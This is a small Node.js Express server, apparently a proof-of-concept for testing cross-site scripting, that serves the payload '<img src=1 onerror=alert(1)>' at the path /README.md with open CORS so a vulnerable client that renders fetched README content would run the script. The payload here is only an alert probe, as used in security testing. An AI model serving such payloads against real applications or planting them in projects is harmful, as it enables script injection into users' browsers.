const express = require("express");
const cors = require('cors')

const app = express()
const port = 4500;

app.use(cors())

app.get('/README.md', (req,res)=>{
    res.send('<img src=1 onerror=alert(1)>')
})

app.listen(port, () =>{
    console.log(`Xss server listening at http://localhost:${port}`);
})